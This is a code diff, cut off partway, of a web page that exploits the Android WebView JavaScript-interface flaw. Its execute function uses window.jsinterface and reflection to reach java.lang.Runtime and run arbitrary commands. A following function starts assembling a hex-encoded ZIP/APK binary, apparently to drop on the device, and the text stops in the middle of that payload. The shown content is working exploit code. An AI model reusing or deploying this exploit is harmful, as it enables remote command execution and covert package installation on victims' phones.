@@ -35,14 +35,10 @@
 <script>
 function execute(cmdArgs)
 {
-    for (var obj in window) {
-        if ("getClass" in window[obj]) {
-            alert(obj);
-            return  window[obj].getClass().forName("java.lang.Runtime")
-                 .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
-        }
-    }
-} 
+
+return window.jsinterface.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+
+}
 
 function myfunction(){
 var armBinary1 = "\\x50\\x4B\\x03\\x04\\x14\\x00\\x08\\x00\\x08\\x00\\x51\\x8F\\xCA\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x13\\x00\\x04\\x00\\x72\\x65\\x73\\x2F\\x6C\\x61\\x79\\x6F\\x75\\x74\\x2F\\x6D\\x61\\x69\\x6E\\x2E\\x78\\x6D\\x6C\\xFE\\xCA\\x00\\x00\\xAD\\x52\\x31\\x6F\\xD3\\x40\\x18\\xFD\\x2E\\x76\\xAE\\x86\\xC4\\x69\\x5A\\x3A\\x54\\xA2\\x12\\xA9\\xC4"
